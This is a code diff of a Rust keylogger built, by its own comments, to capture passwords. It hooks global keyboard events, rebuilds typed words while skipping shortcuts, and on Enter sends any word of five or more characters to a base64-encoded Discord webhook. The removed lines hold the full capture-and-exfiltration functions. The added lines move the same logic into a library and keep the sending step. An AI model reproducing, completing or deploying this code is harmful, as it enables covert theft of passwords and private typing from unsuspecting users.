@@ -1,62 +1,37 @@
-use rdev::{EventType, Key}; // Bane of my existance
-use reqwest::header::CONTENT_TYPE;
-use std::{
-    io::Read,
-    sync::mpsc::{self, Receiver, Sender},
-    time::{Duration, Instant},
-};
-
-// CONFIGURATION LOL
-
-// change this to your webhook URL - CHANGE B4 COMMITTING
-const HOOK_URL: &str = "WEBHOOK";
-
-// Change this to capture whole sentences or just passwords.
-const GET_SENTENCES: bool = false;
-
-// This keylogger is aiming to ONLY get passwords through a variety of methods.
-// If there is a space key entered, for example, we can ignore the proceding word.
-// We could also only get keys entered into a list of programs, such as Chrome.
+use keylogger::*;
+use rdev::{EventType, Key};
+use std::{sync::mpsc, time::Instant};
 
 fn main() -> Result<(), Box<rdev::ListenError>> {
     println!("MAKE SURE TO DELETE THE WEBHOOK BEFORE COMITTING.");
-    // a list of modifiers so we can ignore any keyboard shortcuts.
-    let modifier_keys = [Key::Alt, Key::AltGr, Key::MetaLeft, Key::MetaRight];
-    // how to long to wait if we pressed a modifier
-    let timeout = std::time::Duration::from_millis(10);
-
-    // hold the current word that is being typed.
+    read_from_url();
+    let mut sentence = String::new();
     let mut current_word_buf: Vec<String> = Vec::new();
-    // hold the cursor position
     let mut cursor_pos = 0;
 
-    // To check if ctrl was pressed.
     let (tx, rx) = mpsc::channel::<Instant>();
-    // To check our keyboard shortcuts.
     let (mod_send, mod_recv) = mpsc::channel::<Instant>();
 
     rdev::listen(move |event| {
-        // keep checking if the timers finished.
-        let ctrl_held = timer_done(&rx, timeout);
-        let modkey_held = timer_done(&mod_recv, timeout);
+        let ctrl_held = timer_done(&rx, TIMEOUT);
+        let modkey_held = timer_done(&mod_recv, TIMEOUT);
 
         if let EventType::KeyPress(key) = event.event_type {
-            if modifier_keys.contains(&key) {
-                // if we press a modkey, ignore any typed letters for ~10ms.
+            if MODIFIER_KEYS.contains(&key) {
                 start_timer(mod_send.clone()).unwrap();
             } else {
-                // if it wasn't a modifier, check other keys.
                 match key {
-                    // if we press control key, this starts a timer which writes
-                    // false to _ctrl_held after 10ms.
                     Key::ControlLeft | Key::ControlRight => {
                         start_timer(tx.clone()).unwrap();
                     }
                     Key::Return => {
-                        // at the least a password will be >= 5 characters.
                         if current_word_buf.len() >= 5 {
-                            // unwrap because  closure returns some other error.
-                            current_word_buf.append_to_log().unwrap();
+                            match current_word_buf.append_to_log() {
+                                Ok(_) => (),
+                                Err(err) => {
+                                    eprintln!("{}", err);
+                                },
+                            }
                             current_word_buf.clear();
                             cursor_pos = 0;
                         } else {
@@ -66,10 +41,15 @@ fn main() -> Result<(), Box<rdev::ListenError>> {
                     }
                     Key::Space => {
                         if !GET_SENTENCES {
+                            sentence.push_str(
+                                &current_word_buf
+                                    .iter()
+                                    .map(|s| s.clone())
+                                    .collect::<String>(),
+                            );
                             current_word_buf.clear();
                             cursor_pos = 0;
                         } else {
-                            // Do nothing except add a literal space.
                             handle_key(
                                 Some(" ".to_string()),
                                 ctrl_held,
@@ -80,13 +60,11 @@ fn main() -> Result<(), Box<rdev::ListenError>> {
                         }
                     }
                     Key::RightArrow => {
-                        // Don't move cursor past word.
                         if cursor_pos < current_word_buf.len() {
                             cursor_pos += 1;
                         }
                     }
                     Key::LeftArrow => {
-                        // Don't move cursor past word.
                         if ctrl_held && cursor_pos >= 1 {
                             cursor_pos = 0;
                         } else if cursor_pos >= 1 {
@@ -94,21 +72,20 @@ fn main() -> Result<(), Box<rdev::ListenError>> {
                         }
                     }
 
-                    // I could do something clever but I won't for now
                     Key::UpArrow => {
                         current_word_buf.clear();
                         cursor_pos = 0;
                     }
-                    // This could mean you lose some data but eh
+
                     Key::DownArrow => {
                         current_word_buf.clear();
                         cursor_pos = 0;
                     }
                     Key::Delete => {}
                     Key::Backspace => {
-                        // Check whether to delete the whole word/letters
-                        // -- works on Linux too now.
-                        // before I was using some difference in keycodes
+                        /*                         if GET_SENTENCES {
+                        } else { */
+
                         if ctrl_held {
                             current_word_buf.drain(0..cursor_pos);
                             cursor_pos = 0;
@@ -116,12 +93,11 @@ fn main() -> Result<(), Box<rdev::ListenError>> {
                             && current_word_buf.get(cursor_pos) != Some(&current_word_buf[0])
                             && cursor_pos >= 1
                         {
-                            // This handles the backspace key.
                             current_word_buf.remove(cursor_pos - 1);
                             cursor_pos -= 1;
                         }
-                        println!("{:?} {}", current_word_buf, ctrl_held);
                     }
+
                     _ => {
                         let event = event.name;
                         handle_key(
@@ -138,87 +114,4 @@ fn main() -> Result<(), Box<rdev::ListenError>> {
     })?;
 
     Ok(())
-}
-
-/// Cleans up the main function by moving the code here.
-/// There are a lot of params which have to be passed in unfortunately.
-fn handle_key(
-    event: Option<String>,
-    ctrl_held: bool,
-    modkey_held: bool,
-    cursor_pos: &mut usize,
-    current_word_buf: &mut Vec<String>,
-) {
-    // ignore anything that isn't valid ascii
-    if let Some(key) = event {
-        // only log ascii characters. and only log if we aren't doing a
-        // keyboard shortcut.
-        if check_latin_character(&key) && !ctrl_held && !modkey_held {
-            // Do something with the key.
-            current_word_buf.insert(*cursor_pos, key);
-            *cursor_pos += 1;
-            println!("{:?} {}", current_word_buf, ctrl_held);
-        }
-    }
-}
-
-/// checks whether or not the key is 'valid'
-/// e.g. not a control character.
-fn check_latin_character(key: &str) -> bool {
-    if let Some(key_byte) = key.bytes().last() {
-        // Check if the letter is a simple ASCII char,
-        // these are usually the only valid characters in a password.
-        if key_byte.is_ascii()
-            && key.bytes().last() < Some(127_u8)
-            && key.bytes().last() > Some(31_u8)
-        {
-            return true;
-        }
-        return false;
-    }
-    false
-}
-
-/// Returns whether a 'timer' on another thread has finished
-/// Use to check for modkey and ctrl presses, as well as anything else...
-/// Might be overcomplicated but this made sense earlier for whatever reason.
-fn timer_done(rx: &Receiver<Instant>, timeout: Duration) -> bool {
-    match rx.try_recv() {
-        Ok(timer) => timer.elapsed() >= timeout,
-        Err(_) => false,
-    }
-}
-
-/// Starts a timer which sends itself to the main thread.
-fn start_timer(tx: Sender<Instant>) -> Result<(), std::sync::mpsc::SendError<Instant>> {
-    let start_time = Instant::now();
-    tx.send(start_time)?;
-    Ok(())
-}
-
-/// To make methods that take &self for Vec<String>.
-trait VectorExt {
-    /// Appends to the log, for now it will be a discord webhook because why not?
-    fn append_to_log(&self) -> Result<(), Box<dyn std::error::Error>>;
-}
-
-impl VectorExt for Vec<String> {
-    /// Appends to the log, for now it will be a discord webhook because why not?
-    /// TODO: Stop being lazy.
-    fn append_to_log(&self) -> Result<(), Box<dyn std::error::Error>> {
-        let mut url = String::new();
-        base64_url::decode(&HOOK_URL)
-            .expect("is there a webhook and is it in base64url? please check.")
-            .as_slice()
-            .read_to_string(&mut url)?;
-
-        let payload = format!("{{\"content\":\"{}\"}}", self.join(""));
-        reqwest::blocking::Client::new()
-            .post(url)
-            .body(payload)
-            .header(CONTENT_TYPE, "application/json")
-            .send()?;
-
-        Ok(())
-    }
 }
